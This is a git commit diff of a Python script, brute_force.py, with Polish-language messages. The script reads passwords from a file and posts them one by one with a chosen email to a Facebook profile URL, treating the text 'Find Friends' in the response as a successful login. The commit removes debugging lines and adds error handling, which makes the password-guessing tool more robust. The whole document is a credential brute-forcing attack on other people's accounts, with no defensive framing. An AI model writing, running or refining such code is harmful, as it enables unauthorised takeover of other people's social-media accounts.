23db42fbeab4a22cf8b96e81c60fc64aa2abd7bc
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-11-21 19:47:41 +0100

    Update brute_force.py

--- brute_force.py
+++ brute_force.py
@@ -1,5 +1,4 @@
 import requests
-import pdb
 
 def brute_force(username, fb_id, passwords):
     url = f'https://www.facebook.com/{fb_id}'
@@ -8,13 +7,18 @@ def brute_force(username, fb_id, passwords):
         for password in passwords:
             data = {'email': username, 'pass': password}
 
-            response = session.post(url, data=data)
+            try:
+                response = session.post(url, data=data)
+                response.raise_for_status()  # Sprawdzanie błędów HTTP
 
-            if 'Find Friends' in response.text:
-                print(f'Prawidłowe hasło znalezione: {password}')
-                break
-            else:
-                print(f'Nieprawidłowe hasło: {password}')
+                if 'Find Friends' in response.text:
+                    print(f'Prawidłowe hasło znalezione: {password}')
+                    break
+                else:
+                    print(f'Nieprawidłowe hasło: {password}')
+
+            except requests.exceptions.RequestException as e:
+                print(f'Błąd podczas żądania HTTP: {e}')
 
 def main():
     email = input('Podaj adres e-mail (jako nazwę użytkownika): ')
@@ -24,7 +28,6 @@ def main():
     with open(password_file, 'r') as file:
         passwords = [line.strip() for line in file]
 
-    pdb.set_trace()  # Dodaj to miejsce do debugowania
     brute_force(email, fb_id, passwords)
 
 if __name__ == '__main__':
